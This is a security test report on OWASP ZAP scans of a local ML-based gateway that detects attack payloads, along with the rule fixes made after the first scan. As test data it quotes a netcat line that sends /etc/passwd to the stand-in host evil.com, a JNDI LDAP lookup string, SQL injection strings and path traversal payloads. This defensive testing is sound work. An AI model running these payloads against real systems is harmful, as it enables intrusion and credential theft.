# OWASP ZAP and ATRDF verification

Current six-family detector and Table VI: `research/atrdf_payload_experiment/HELDOUT_SIX_REPORT.md`. Model name on the review path is now `candidate_binary_rf_six_heldout`. Historical rows below that name `candidate_binary_rf_payload_six` or a 1.000 validation mask are from 2026-10-11 and are not the reported table.

Scan date: 2026-10-11. Target: the review gateway at `http://127.0.0.1:8081` only. Production port 8080 was not scanned, restarted, or given a new model.

## Setup

ZAP was not already installed. `zap`, `zap.bat`, and `zap.sh` were absent from `PATH`. `docker.exe` is present at `C:\Users\jatin\AppData\Local\Programs\DockerDesktop\resources\bin\docker.exe`, and `docker info` failed because the Docker Desktop Linux engine pipe was not running. Docker Desktop was not started. The official cross-platform package was used instead.

Download:

```text
curl.exe -L --fail --retry 2 -o %LOCALAPPDATA%\Programs\ZAP\ZAP_2.17.0_Crossplatform.zip https://github.com/zaproxy/zaproxy/releases/download/v2.17.0/ZAP_2.17.0_Crossplatform.zip
```

File size 286,652,857 bytes. SHA-256 `94c8f767b1c2e94f0db66b3ae56514d5e3f5a728ee1b6c798e0c8fe2d61fbff0`, matching the ZAP 2.17.0 release checksum. Extracted to `%LOCALAPPDATA%\Programs\ZAP\ZAP_2.17.0`. This copy is outside the git repository.

Port 8090 was already held by Wondershare `WsToastNotification.exe` (PID 18424). That process was left running. ZAP was started on 8091 with the local JDK 21:

```text
"C:\Program Files\Microsoft\jdk-21.0.12.101-hotspot\bin\java.exe" -Xmx1g -jar "%LOCALAPPDATA%\Programs\ZAP\ZAP_2.17.0\zap-2.17.0.jar" -daemon -host 127.0.0.1 -port 8091 -dir "%LOCALAPPDATA%\Programs\ZAP\home" -config api.disablekey=true -config api.addrs.addr.name=127.0.0.1 -config api.addrs.addr.regex=false -config start.checkForUpdates=false
```

The daemon log recorded `ZAP is now listening on 127.0.0.1:8091`. `GET http://127.0.0.1:8091/JSON/core/view/version/` returned `{"version":"2.17.0"}`. The API is bound to loopback and the API key is disabled for that local listener.

Review services already listening, and left running:

| Port | PID | Process |
|---|---|---|
| 8081 | 17256 | review gateway, `--gateway.atrdf.profile=experimental-payload` |
| 8000 | 33372 | Python ML service, uvicorn |
| 5001 | 5376 | demo API |
| 5173 | 23736 | Vite frontend |
| 8080 | 32176 | production gateway, no experimental profile |

`GET /health` on 8081, 8000, and 8080 returned HTTP 200. `GET http://127.0.0.1:5001/api/health` returned HTTP 200. The project manifest `zap/manifests/live_experiment.yaml` still names `http://127.0.0.1:8080` and was not executed.

## Scan scope

Context `review8081` included only `http://127.0.0.1:8081`. Spider and active scan excluded ports 8080, 5001, 5173, and 8000, and excluded `/api/auth/`. The active scan sent GET requests only. It did not send PUT or DELETE, so it could not edit or delete seeded books. The OAST active-scan service was empty (`getActiveScanService` returned `""`), so callback scanners were not selected. The Log4Shell scanner was not enabled. No operating-system command was executed. Payloads were query text sent to `127.0.0.1`.

Passive scan ran before the active scan. The spider finished at 100% and recorded 14 URLs, including `/`, `/health`, `/api/health`, `/api/books`, `/api/books/101`, `/api/books?category=Technology`, `/api/comments/book/101`, and `/api/telemetry/stats`.

The first active-scan attempts against the host root and against `/api/books?search=protocol&category=Technology` did not inject the query string. ZAP normalized those jobs onto `/api/books` and sent a small number of path probes. Query injection started after `setOptionAddQueryParam=true` and a scan of the spider node `http://127.0.0.1:8081/api/books?category=Technology` (ZAP scan id 3, status 100, 133 messages).

Policy `bounded-safe` enabled these rules: Path Traversal (6), Cross Site Scripting Reflected (40012), SQL Injection (40018), the time-based SQL variants (40019, 40020, 40021, 40022, 40024, 40027), Server Side Code Injection (90019), Remote OS Command Injection (90020), Server Side Template Injection (90035), Server Side Template Injection Blind (90036), Remote OS Command Injection Time Based (90037), and CRLF Injection (40003). DOM XSS (40026) was skipped because ZAP could not start a browser. Strength was MEDIUM for the error-based SQL, reflected XSS, path, CRLF, and code-injection rules, and LOW for the time-based rules. Each rule was capped at one minute and the scan at eight minutes.

## ZAP findings

These are ZAP alerts. They are separate from gateway decisions.

| Risk | Alert | Plugin | Count |
|---|---|---|---|
| Medium | Cross-Domain Misconfiguration | 10098 | 14 |
| Low | X-Content-Type-Options Header Missing | 10021 | 7 |
| Low | Server Leaks Information via X-Powered-By | 10037 | 5 |
| Informational | Content-Type Header Missing | 10019 | 5 |

ZAP did not raise a confirmed SQL injection, XSS, path traversal, command injection, or Log4Shell alert. The injection rules sent payloads, the gateway answered 403 or a normal JSON catalog response, and ZAP did not see an error, a delay, or a reflected script that met its alert threshold.

## Gateway decisions on the ZAP active scan

Scan id 3 produced 133 GET messages. 132 joined to gateway telemetry. One HTTP 404 had no telemetry row.

| Gateway decision | ML class | Rule | Backend reached | HTTP | Count |
|---|---|---|---|---|---|
| ALLOW | BENIGN | none | yes | 200 | 83 |
| ALLOW | BENIGN | none | yes | 404 | 2 |
| BLOCK | SQL Injection | none | no | 403 | 12 |
| BLOCK | RCE | none | no | 403 | 9 |
| BLOCK | BENIGN, malicious 0.0 | `ATRDF-PATH-TRAVERSAL` | no | 403 | 8 |
| BLOCK | Log Forging | none | no | 403 | 7 |
| BLOCK | Directory Traversal | `ATRDF-PATH-TRAVERSAL` | no | 403 | 4 |
| BLOCK | RCE | `ATRDF-MARKUP-SCRIPT` | no | 403 | 3 |
| BLOCK | RCE | `ATRDF-COMMAND-CHAIN` | no | 403 | 1 |
| BLOCK | RCE | `ATRDF-PATH-TRAVERSAL` | no | 403 | 1 |
| BLOCK | Cookie Injection | none | no | 401 | 1 |
| BLOCK | BOLA | none | no | 403 | 1 |

Model name on the ATRDF rows was `candidate_binary_rf_payload_six`. Blocked ATRDF rows were malicious probability 1.0. The three markup rows are ZAP's reflected-XSS strings (`<script>alert(1)` and `<img onerror>`). The model classed them as RCE because `markup_script` is still an RCE flag. Those three are not counted as XSS detections and are not counted as successful RCE detections. The comment store was not changed.

Examples that the model blocked before the backend:

- REQ-1279, template marker in `category`, class RCE, mitigation `BLOCK (Execution: NOT PERFORMED)`, backend false.
- REQ-1296, a Velocity-style `Runtime.exec("sleep 15")` string containing a newline, class Log Forging, mitigation `BLOCK / ALERT + structured logging`, backend false.
- REQ-1313, `category=Set-cookie: Tamper=...`, class Cookie Injection, HTTP 401, mitigation `BLOCK + session validation`, backend false.

The quoted SQL forms ZAP sent, including `Technology' AND '1'='1' --` and `UNION ALL select NULL`, were in the 12 SQL Injection blocks. The deterministic SQL rule did not match those particular strings. The model did.

Eight path-like values were ML-benign at malicious probability 0.0 and were still blocked by `ATRDF-PATH-TRAVERSAL`. Example: REQ-1195 `category=c:\Windows\system.ini`, ML decision ALLOW, rule MATCH, final decision BLOCK, backend false. The same rule caught `WEB-INF\web.xml` and `type %SYSTEMROOT%\win.ini`.

Twenty-four attack-shaped payloads were allowed through to the demo API. The API treated `category` as a catalog filter and did not execute the text. Examples:

- REQ-1197 `category=/etc/passwd`, BENIGN 1.0, no rule, HTTP 200, backend true.
- REQ-1269 `category=cat /etc/passwd`, BENIGN 1.0, HTTP 200, backend true.
- REQ-1250 `pg_sleep(15)`, REQ-1247 `DBMS_SESSION.SLEEP(15)`, and REQ-1235 `sleep(15)`, all BENIGN 1.0, HTTP 200, backend true.
- REQ-1308 `category=Technology;sleep 15.0;`, BENIGN 1.0, HTTP 200, backend true.
- REQ-1298 an ERB `execSync('sleep 15')` string and REQ-1306 `{system("sleep 15")}`, both BENIGN 1.0, HTTP 200, backend true.

A ZAP path probe `GET /api/books/6625151467574011453` is REQ-1121. Model `bola_rf_behavioral` predicted BOLA, the gateway decision was BLOCK, HTTP 403, and the backend was not reached. That id is not a seeded book. This is a gateway false positive on an unknown book id, recorded separately from the ZAP header alerts.

## Controlled family checks

These requests were sent to `http://127.0.0.1:8081` after scan id 3, experiment `EXP-ZAP-REG-8081`. The LOG4J body used `${jndi:ldap://test-research-domain.invalid:1389/Exploit}` so the marker stays on a reserved name. The RCE query was the saved lab string `; cat /etc/passwd | nc evil.com 4444` sent only as text to `127.0.0.1`. The backend was not reached.

| Case | Request | ML | Rule | HTTP | Backend |
|---|---|---|---|---|---|
| SQLI_001 | REQ-1140 `GET /api/books?search=' OR '1'='1 -- UNION SELECT *` | SQL Injection, malicious 1.0, `BLOCK + parameterized query path` | `ATRDF-SQL-STRUCTURE` | 403 | false |
| COOKIE_001 | REQ-1141 `GET /api/books` with `admin=true; role=superadmin` | Cookie Injection, malicious 1.0, `BLOCK + session validation` | `ATRDF-COOKIE-AUTHORITY` | 401 | false |
| RCE_001 | REQ-1142 | RCE, malicious 1.0, `BLOCK (Execution: NOT PERFORMED)` | `ATRDF-COMMAND-CHAIN` | 403 | false |
| TRAVERSAL_001 | REQ-1143 `GET /api/books/..%2F..%2F..%2Fetc%2Fpasswd` | Directory Traversal, malicious 1.0, `BLOCK + path validation` | `ATRDF-PATH-TRAVERSAL` | 403 | false |
| LOGFORGE_001 | REQ-1144 comment text with the two-character `\r\n` sequence | Log Forging, malicious 1.0, `BLOCK / ALERT + structured logging` | `ATRDF-LOG-LINE` | 403 | false |
| LOG4J_001 | REQ-1145 | LOG4J, malicious 1.0, `BLOCK / ALERT + safe logging` | `ATRDF-JNDI-LOOKUP` | 403 | false |
| XSS_001 | REQ-1146 | RCE, malicious 1.0, out of scope | `ATRDF-MARKUP-SCRIPT` | 403 | false |

XSS_001 is not a supported ML detection. The comment count on book 101 stayed 1.

## BOLA

Seeded users logged in through the review gateway. Tokens were not printed.

| Check | Request | ML | Gateway | HTTP | Backend | Result |
|---|---|---|---|---|---|---|
| user01 management read of book 201 | REQ-1147 `GET /api/books/201?view=manage` | BOLA, `bola_rf_behavioral`, BLOCK | ALERT | 403 | true | Body `BOLA_AUTHORIZATION_DENIED`. Book body not returned. |
| user01 `access=edit` of book 201 | REQ-1148 | BOLA BLOCK | ALERT | 403 | true | Same denial. |
| user01 PUT book 201 | REQ-1149 | BOLA BLOCK | ALERT | 403 | true | Body `BOLA_PERMISSION_DENIED`. |
| user01 DELETE book 301 | REQ-1150 | BOLA BLOCK | ALERT | 403 | true | Body `BOLA_PERMISSION_DENIED`. |
| user02 management read of book 201 | REQ-1151 | NORMAL, ALLOW | ALLOW | 200 | true | Owner read succeeded. |

After these calls the demo API still returned book 201 title `Applied Machine Learning in Anomaly Detection` owned by user02, and book 301 title `Cryptography and Public Key Infrastructure` owned by user03.

## Regression after the scan

The 35-case benign suite, experiment `EXP-ZAP-SUITE2-8081`, returned HTTP 200 and decision ALLOW for all 35. Backend was reached. Malicious probability was 0.0 and the rule was `NONE`. REQ-1187 `GET /api/books?search=protocol&ref=a+b;c` was ALLOW, BENIGN 1.0, backend true, model `candidate_binary_rf_payload_six`.

Reloading `http://localhost:5173/` rendered the seeded catalog, including `Foundations of Network Protocol Security` by Dr. Evelyn Carter, `Applied Machine Learning in Anomaly Detection`, and `Cryptography and Public Key Infrastructure`. The browser sent REQ-1320 and REQ-1321, both `GET /api/books`, default experiment `EXP-LIVE`, test case `CASE-WEB`, ALLOW, BENIGN 1.0, rule `NONE`, telemetry status 304, backend true, model `candidate_binary_rf_payload_six`.

SHA-256 of the 12 files under `models/atrdf` and `models/bola` was unchanged from the pre-scan snapshot. Production PID 32176 was still `security-gateway-1.0.0.jar --server.port=8080` with no experimental profile.

## Limitations

- ZAP's time-based SQL and several template or command strings that lack the project's structural flags were allowed through as catalog filters. The demo API did not execute them. They are missed detections for this model and rule set.
- Eight Windows-path payloads were caught only by `ATRDF-PATH-TRAVERSAL`. The model scored them benign.
- XSS remains outside the six-family evaluation. Markup was scored as RCE and is not counted.
- DOM XSS could not run because ZAP had no browser. Reflected XSS payloads were sent as query text.
- The active scan did not authenticate, and it did not PUT or DELETE. BOLA was checked with separate seeded logins.
- A random unknown book id was hard-blocked by the BOLA model before the backend.
- ZAP remains installed for this user at `%LOCALAPPDATA%\Programs\ZAP\ZAP_2.17.0` and was left listening on `127.0.0.1:8091`.

## Follow-up on the missed payloads and header findings

The catalog search in `demo_api/server.js` compares `category` and `search` with `String.includes`. It does not build a SQL statement and it does not pass the text to a shell. The 24 allowed payloads therefore reached the backend as ordinary filter text. They could not change a query structure or start a command. They are still suspicious expressions, so the review-profile guard now blocks those shapes. The candidate model files were not retrained and the structural feature formulas were not changed. On these payloads the model remains BENIGN with decision ALLOW. The review rule supplies the block.

`path_traversal` is only `../` and `..\`. That is why `c:\Windows\system.ini`, `WEB-INF\web.xml`, and `type %SYSTEMROOT%\win.ini` scored benign. The earlier rule already matched a literal backslash. The guard now also matches `/etc/passwd`, `web-inf/`, `win.ini`, `system.ini`, `%SYSTEMROOT%`, and a drive path such as `c:/Windows`. Command-shaped strings are matched before the file-path rule, so `cat /etc/passwd` stays `ATRDF-COMMAND-CHAIN`.

Checked on the new review gateway, PID 32816, experiment `EXP-ZAP-FIX-8081`. Every row is HTTP 403, ML class BENIGN, ML decision ALLOW, backend false:

| Payload | Request | Rule |
|---|---|---|
| `/etc/passwd` | REQ-1011 | `ATRDF-PATH-TRAVERSAL` |
| `cat /etc/passwd` | REQ-1012 | `ATRDF-COMMAND-CHAIN` |
| `Technology;sleep 15.0;` | REQ-1013 | `ATRDF-COMMAND-CHAIN` |
| `Technology&sleep 15.0&` | REQ-1014 | `ATRDF-COMMAND-CHAIN` |
| `Technology;start-sleep -s 15.0` | REQ-1015 | `ATRDF-COMMAND-CHAIN` |
| `pg_sleep(15)` | REQ-1016 | `ATRDF-SQL-STRUCTURE` |
| `DBMS_SESSION.SLEEP(15)` | REQ-1017 | `ATRDF-SQL-STRUCTURE` |
| `sleep(15)` | REQ-1018 | `ATRDF-SQL-STRUCTURE` |
| `java.lang.Thread.sleep` | REQ-1019 | `ATRDF-SQL-STRUCTURE` |
| ERB `execSync('sleep 15')` | REQ-1020 | `ATRDF-COMMAND-CHAIN` |
| `{system("sleep 15")}` | REQ-1021 | `ATRDF-COMMAND-CHAIN` |
| `c:\Windows\system.ini` | REQ-1022 | `ATRDF-PATH-TRAVERSAL` |
| `c:/Windows/system.ini` | REQ-1023 | `ATRDF-PATH-TRAVERSAL` |
| `WEB-INF\web.xml` | REQ-1024 | `ATRDF-PATH-TRAVERSAL` |
| `WEB-INF/web.xml` | REQ-1025 | `ATRDF-PATH-TRAVERSAL` |
| `type %SYSTEMROOT%\win.ini` | REQ-1026 | `ATRDF-PATH-TRAVERSAL` |

Ordinary values stayed allowed with the backend reached: `category=Technology`, `category=Science`, `search=sleep`, `search=protocol&ref=a+b;c`, and `search=C++`.

The review gateway no longer sends `Access-Control-Allow-Origin: *`. A request whose `Origin` is `http://localhost:5173` or `http://127.0.0.1:5173` (and the same hosts on port 5174) receives that origin back, plus `X-Content-Type-Options: nosniff`. `X-Powered-By` from the demo API is dropped on the way out. Responses that lacked a content type and had a JSON body are sent as `application/json`. An `Origin` of `https://evil.example` receives no allow-origin header. These headers were checked on `/`, `/health`, `/api/health`, `/api/books`, `/api/books/101`, `/api/books?category=Technology`, `/api/comments/book/101`, `/api/telemetry/stats`, `/robots.txt`, and `/sitemap.xml`. Production profile code still emits `*` and was not deployed to port 8080.

The same pass repeated the six in-scope cases: SQLI_001 REQ-1032, COOKIE_001 REQ-1033, RCE_001 REQ-1034, TRAVERSAL_001 REQ-1035, LOGFORGE_001 REQ-1038, LOG4J_001 REQ-1039. Each was malicious probability 1.0, the matching rule, and backend false. XSS_001 REQ-1040 was class RCE with `ATRDF-MARKUP-SCRIPT` and is not counted. Book 101 still had 1 comment.

user01 management read REQ-1041, PUT REQ-1042, and DELETE REQ-1043 were HTTP 403, gateway ALERT, backend true. Book 201 and book 301 were unchanged. The owner read REQ-1044 was HTTP 200. A disposable book `111` was created as REQ-1045 (HTTP 201), user02's delete REQ-1046 was HTTP 403, and the owner's delete REQ-1047 was HTTP 200. A later read of book 111 on the demo API was HTTP 404.

`ReviewRequestGuardTest`, `ReviewInspectionGatewayTest`, and `PayloadFeaturesTest` passed: 6 tests, 0 failures, BUILD SUCCESS at 2026-10-11T15:04:00+05:30. Python `test_payload_features.py` passed 22 cases. The 35-case suite `EXP-ZAP-FIX-SUITE` was 35/35 HTTP 200 ALLOW. Reloading `http://localhost:5173/` rendered the seeded titles. REQ-1083 and REQ-1084 were ALLOW, BENIGN, status 304, backend true, model `candidate_binary_rf_payload_six`.

The review process is PID 32816 on port 8081. Production PID 32176 and the files under `models/atrdf` and `models/bola` were not replaced.

Remaining limits: the saved model still scores these new shapes benign, so the block exists only on the experimental review profiles. A lone word such as `sleep`, without a call or a duration after a separator, stays allowed. XSS is still outside the six-family model. Unknown book ids can still be hard-blocked by the BOLA model.

## Final ZAP rerun after the header and rule fixes

Date: 2026-10-11. ZAP 2.17.0 was already listening on `127.0.0.1:8091`. A new session, `final-verify-8081`, cleared the earlier alerts. Context `review8081` included only `http://127.0.0.1:8081` and excluded `/api/auth/`. The spider and active scan also excluded ports 8080, 5001, 8000, and 5173. The OAST active-scan service was still empty. Log4Shell stayed disabled. Policy `bounded-safe` was the same 15 GET scanners as the first scan. `setOptionAddQueryParam` was true. Each rule was capped at one minute and the scan at eight minutes.

The review stack was already up and was not restarted: gateway PID 32816 on 8081 (`--gateway.atrdf.profile=experimental-payload`), ML PID 33372 on 8000, demo API PID 5376 on 5001, Vite PID 23736 on 5173. Production PID 32176 remained `security-gateway-1.0.0.jar --server.port=8080` with no experimental profile. The project manifest that targets port 8080 was not run.

The spider reached 100% and recorded 14 URLs, all on `127.0.0.1:8081`: `/`, `/health`, `/api/health`, `/api/books`, `/api/books/101`, `/api/books?category=Technology`, `/api/comments/book/101`, `/api/telemetry/stats`, `/robots.txt`, `/sitemap.xml`, and the parent paths `/api`, `/api/comments`, `/api/comments/book`, and `/api/telemetry`. Passive scan drained to zero records before the active scan.

Active scan id 0 targeted `http://127.0.0.1:8081/api/books?category=Technology` with method GET and recurse false. It finished at 100%. ZAP history for this session was 168 messages, all GET, all aimed at `127.0.0.1:8081`. No PUT or DELETE was sent by ZAP. 155 responses carried `X-Request-Id` and joined to gateway telemetry. Of the other 13, eight are `/health` and `/api/telemetry` responses, which skip inspection and do not get a request id. Five are `HTTP/1.0 0` connection failures with no response; those same paths were fetched successfully elsewhere in the session.

Scanner request counts, and the alert count from each scanner:

| Plugin | Id | Requests | Alerts |
|---|---|---|---|
| Path Traversal | 6 | 15 | 0 |
| Cross Site Scripting (Reflected) | 40012 | 5 | 0 |
| SQL Injection | 40018 | 22 | 0 |
| SQL Injection - MySQL (Time Based) | 40019 | 6 | 0 |
| SQL Injection - Hypersonic SQL (Time Based) | 40020 | 6 | 0 |
| SQL Injection - Oracle (Time Based) | 40021 | 3 | 0 |
| SQL Injection - PostgreSQL (Time Based) | 40022 | 3 | 0 |
| SQL Injection - SQLite (Time Based) | 40024 | 2 | 0 |
| SQL Injection - MsSQL (Time Based) | 40027 | 6 | 0 |
| Server Side Code Injection | 90019 | 8 | 0 |
| Remote OS Command Injection | 90020 | 9 | 0 |
| Server Side Template Injection | 90035 | 17 | 0 |
| Server Side Template Injection (Blind) | 90036 | 12 | 0 |
| Remote OS Command Injection (Time Based) | 90037 | 6 | 0 |
| CRLF Injection | 40003 | 7 | 0 |

### Alerts that disappeared

The fresh passive scan did not report the four earlier findings:

| Previous alert | Plugin | Earlier count | This scan |
|---|---|---|---|
| Cross-Domain Misconfiguration | 10098 | 14 medium | absent |
| X-Content-Type-Options Header Missing | 10021 | 7 low | absent |
| Server Leaks Information via X-Powered-By | 10037 | 5 low | absent |
| Content-Type Header Missing | 10019 | 5 informational | absent |

Direct header probes on the spider routes agree. `X-Content-Type-Options: nosniff` was present on all 30 probes. `X-Powered-By` was absent on all 30. `Origin: https://evil.example` was never copied into `Access-Control-Allow-Origin`. `Origin: http://localhost:5173` was echoed on the reviewed routes. `GET /api/books` and `GET /health` without a foreign origin returned `Content-Type: application/json`. `GET /api/books?category=Technology` and `GET /api/comments/book/101` did the same.

`GET /health` and `GET /api/telemetry/stats` with `Origin: https://evil.example` returned HTTP 403 and the body `Invalid CORS request`. Those two routes use the controller `@CrossOrigin` allowlist, so Spring rejects the foreign origin instead of reflecting it. That 403 has `nosniff` and no allow-origin header. It is a plain sentence, so it has no content type. It is not a JSON response and ZAP did not raise plugin 10019 for it.

### Alert that remains

One new passive alert remains: CSP Failure to Define Directive with No Fallback, plugin 10055, medium, high confidence, count 5.

| URL | Status | Content-Type |
|---|---|---|
| `/sitemap.xml` | 404 | `text/html;charset=utf-8` |
| `/robots.txt` | 404 | `text/html;charset=utf-8` |
| `/api` | 404 | `text/html;charset=utf-8` |
| `/api/comments` | 404 | `text/html;charset=utf-8` |
| `/api/comments/book` | 404 | `text/html;charset=utf-8` |

The body is the demo API sentence `Cannot GET <path>`. There is no Content-Security-Policy header. ZAP's evidence is `default-src 'none'`, and the alert text says `frame-ancestors` and `form-action` have no fallback. `nosniff` is set. The reflected-XSS scanner sent 5 requests and raised no alert. These pages contain no script and no form. This is a hardening note on HTML 404s, not a confirmed injection and not a return of the four header findings. No further code change is required for this rerun.

### Gateway decisions on scan id 0

Model name on the ATRDF rows was `candidate_binary_rf_payload_six`. A row whose ML decision is ALLOW and whose class is BENIGN at malicious probability 0.0 was not detected by the model. The review rule supplied the block.

| Gateway decision | ML decision | ML class | Rule | Backend | HTTP | Count |
|---|---|---|---|---|---|---|
| ALLOW | ALLOW | BENIGN | none | yes | 200 | 59 |
| ALLOW | ALLOW | BENIGN | none | yes | 404 | 11 |
| BLOCK | ALLOW | BENIGN 0.0 | `ATRDF-SQL-STRUCTURE` | no | 403 | 17 |
| BLOCK | ALLOW | BENIGN 0.0 | `ATRDF-PATH-TRAVERSAL` | no | 403 | 13 |
| BLOCK | ALLOW | BENIGN 0.0 | `ATRDF-COMMAND-CHAIN` | no | 403 | 13 |
| BLOCK | BLOCK | SQL Injection 1.0 | `ATRDF-SQL-STRUCTURE` | no | 403 | 7 |
| BLOCK | BLOCK | SQL Injection 1.0 | none | no | 403 | 5 |
| BLOCK | BLOCK | RCE 1.0 | none | no | 403 | 7 |
| BLOCK | BLOCK | RCE 1.0 | `ATRDF-COMMAND-CHAIN` | no | 403 | 3 |
| BLOCK | BLOCK | RCE 1.0 | `ATRDF-PATH-TRAVERSAL` | no | 403 | 1 |
| BLOCK | BLOCK | RCE 1.0 | `ATRDF-MARKUP-SCRIPT` | no | 403 | 3 |
| BLOCK | BLOCK | Log Forging 1.0 | none | no | 403 | 7 |
| BLOCK | BLOCK | Directory Traversal 1.0 | `ATRDF-PATH-TRAVERSAL` | no | 403 | 4 |
| BLOCK | BLOCK | Cookie Injection 1.0 | none | no | 401 | 1 |
| BLOCK | BLOCK | BOLA | none | no | 403 | 4 |

The three markup rows are reflected-XSS strings. The model classed them as RCE because `markup_script` is still an RCE flag. They are not XSS detections and they are not successful RCE detections. Examples of a rule block where the model stayed benign: REQ-1151 SQL time-style text, REQ-1109 a file target, REQ-1185 a command-shaped string. Examples the model itself blocked: REQ-1145 SQL Injection, REQ-1203 RCE, REQ-1212 Log Forging, REQ-1110 Directory Traversal, REQ-1229 Cookie Injection.

The four BOLA rows are unauthenticated GETs. REQ-1088 and REQ-1098 are `GET /api/books/101`. REQ-1105 is `GET /api/books/3005876295738407341`. Model `bola_rf_behavioral` blocked both before the backend. Book 101 was not modified. This is the same hard block on a book-id GET that was recorded on the first scan.

### Previously missed payloads

Experiment `EXP-ZAP-FINAL-PAYLOADS`. Every row is ML decision ALLOW, class BENIGN, malicious probability 0.0, HTTP 403, backend false, model `candidate_binary_rf_payload_six`. The rule is the block.

| Payload | Request | Rule |
|---|---|---|
| `/etc/passwd` | REQ-1260 | `ATRDF-PATH-TRAVERSAL` |
| `cat /etc/passwd` | REQ-1261 | `ATRDF-COMMAND-CHAIN` |
| `Technology;sleep 15.0;` | REQ-1262 | `ATRDF-COMMAND-CHAIN` |
| `Technology&sleep 15.0&` | REQ-1263 | `ATRDF-COMMAND-CHAIN` |
| `Technology;start-sleep -s 15.0` | REQ-1264 | `ATRDF-COMMAND-CHAIN` |
| `pg_sleep(15)` | REQ-1265 | `ATRDF-SQL-STRUCTURE` |
| `(DBMS_SESSION.SLEEP(15))` | REQ-1266 | `ATRDF-SQL-STRUCTURE` |
| `Technology / sleep(15)` | REQ-1267 | `ATRDF-SQL-STRUCTURE` |
| `"java.lang.Thread.sleep"(15000)` | REQ-1268 | `ATRDF-SQL-STRUCTURE` |
| ERB `execSync('sleep 15')` | REQ-1269 | `ATRDF-COMMAND-CHAIN` |
| `{system("sleep 15")}` | REQ-1270 | `ATRDF-COMMAND-CHAIN` |
| `c:\Windows\system.ini` | REQ-1271 | `ATRDF-PATH-TRAVERSAL` |
| `c:/Windows/system.ini` | REQ-1272 | `ATRDF-PATH-TRAVERSAL` |
| `WEB-INF\web.xml` | REQ-1273 | `ATRDF-PATH-TRAVERSAL` |
| `WEB-INF/web.xml` | REQ-1274 | `ATRDF-PATH-TRAVERSAL` |
| `type %SYSTEMROOT%\win.ini` | REQ-1275 | `ATRDF-PATH-TRAVERSAL` |

Ordinary values stayed allowed, backend true, malicious probability 0.0, rule `NONE`: `category=Technology` REQ-1276, `category=Science` REQ-1277, `search=sleep` REQ-1278, `search=protocol&ref=a+b;c` REQ-1279, and `search=C++` REQ-1280.

### Six in-scope cases and the benign suite

Experiment `EXP-ZAP-FINAL-LAB`. The six in-scope cases were model blocks at malicious probability 1.0. The matching rule also matched. The backend was not reached. LOG4J used `${jndi:ldap://test-research-domain.invalid:1389/Exploit}`. The RCE string was sent only as query text to `127.0.0.1`.

| Case | Request | ML | Rule | HTTP | Backend | Counted |
|---|---|---|---|---|---|---|
| SQLI_001 | REQ-1281 | SQL Injection, `BLOCK` | `ATRDF-SQL-STRUCTURE` | 403 | false | Yes |
| COOKIE_001 | REQ-1282 | Cookie Injection, `BLOCK` | `ATRDF-COOKIE-AUTHORITY` | 401 | false | Yes |
| RCE_001 | REQ-1283 | RCE, `BLOCK` | `ATRDF-COMMAND-CHAIN` | 403 | false | Yes |
| TRAVERSAL_001 | REQ-1284 | Directory Traversal, `BLOCK` | `ATRDF-PATH-TRAVERSAL` | 403 | false | Yes |
| LOGFORGE_001 | REQ-1285 | Log Forging, `BLOCK` | `ATRDF-LOG-LINE` | 403 | false | Yes |
| LOG4J_001 | REQ-1286 | LOG4J, `BLOCK` | `ATRDF-JNDI-LOOKUP` | 403 | false | Yes |
| XSS_001 | REQ-1287 | RCE at malicious 1.0, out of scope | `ATRDF-MARKUP-SCRIPT` | 403 | false | No |

The 35-case suite, experiment `EXP-ZAP-FINAL-SUITE`, is REQ-1288 through REQ-1322. All 35 were HTTP 200, decision ALLOW, ML ALLOW, BENIGN, malicious probability 0.0, rule `NONE`, backend true, model `candidate_binary_rf_payload_six`.

`ReviewRequestGuardTest`, `ReviewInspectionGatewayTest`, and `PayloadFeaturesTest`: 6 tests, 0 failures, BUILD SUCCESS at 2026-10-11T15:21:40+05:30. Python `test_payload_features.py` passed 22 cases.

### BOLA and protected data

Seeded logins went through the review gateway. Tokens were not printed. Login itself is unauthenticated, so those two rows record user `unknown`. The later calls record the verified username.

| Check | Request | ML | Gateway | HTTP | Backend | Body |
|---|---|---|---|---|---|---|
| user01 management read of book 201 | REQ-1340 | BOLA BLOCK, `bola_rf_behavioral` | ALERT | 403 | true | `BOLA_AUTHORIZATION_DENIED` |
| user01 `access=edit` of book 201 | REQ-1341 | BOLA BLOCK | ALERT | 403 | true | `BOLA_AUTHORIZATION_DENIED` |
| user01 PUT book 201 | REQ-1342 | BOLA BLOCK | ALERT | 403 | true | `BOLA_PERMISSION_DENIED` |
| user01 DELETE book 301 | REQ-1343 | BOLA BLOCK | ALERT | 403 | true | `BOLA_PERMISSION_DENIED` |
| user02 management read of book 201 | REQ-1344 | BOLA BLOCK | ALERT | 200 | true | Owner title returned |

An earlier pass, REQ-1325 through REQ-1329, had the same HTTP results. The model decision on the owner read stays BLOCK. The gateway decision is ALERT, and the demo API allows the owner. That is not an ML allow.

Before the scan and after the delete attempt, the demo API still returned book 101 `Foundations of Network Protocol Security` owned by user01, book 201 `Applied Machine Learning in Anomaly Detection` owned by user02, and book 301 `Cryptography and Public Key Infrastructure` owned by user03. Book 101 still had 1 comment.

Reloading `http://localhost:5173/` rendered those titles and the rest of the seeded catalog. The browser sent REQ-1335 (`GET /api/books`, HTTP 200) and REQ-1336 and REQ-1337 (HTTP 304). All three were experiment `EXP-LIVE`, test case `CASE-WEB`, ALLOW, BENIGN, malicious probability 0.0, rule `NONE`, backend true, model `candidate_binary_rf_payload_six`. The gateway recorded user `unknown` on those catalog reads.

SHA-256 of the 12 files under `models/atrdf` and `models/bola` matched the pre-scan snapshot. Production PID 32176 was still the production jar.

No further fix is required. The four previous ZAP header findings are gone on this scan. The remaining CSP alert is the HTML 404 note above. The saved model still scores the extended SQL, command, and file-target shapes benign; the review rule blocks them, and that split is intentional because the candidate was not retrained. XSS stays outside the six-family evaluation. A public `GET /api/books/{id}` can still be a BOLA-model hard block.

## Public book read and HTML error policy

`GET /api/books/101` is a public catalog read. `demo_api/server.js` returns the book record when `view` is not `manage` and `access` is not `edit`. It does not check a JWT or an owner for that form. `view=manage`, `access=edit`, PUT, and DELETE remain owner-checked.

The path still selects the BOLA model, because it matches `/api/books/{id}`. An anonymous caller is `unknown`, and book 101 is owned by user01, so the model scores a cross-owner access and returns BLOCK. On the earlier review gateway that score became the HTTP result, which is why REQ-1088 and REQ-1098 never reached the backend. That was a false positive for this route. The model file was not changed.

On the review profiles only, a plain GET or HEAD of `/api/books/{id}` now keeps `mlDecision` BLOCK and sets the gateway decision to ALERT with mitigation `ALERT + public catalog read`. The demo API returns the record. Management and mutation routes still use `ALERT + backend authorization`, so the JWT and owner checks stay in the demo API. The production profile source still hard-blocks a BOLA BLOCK on a plain book read. The running production process was not replaced.

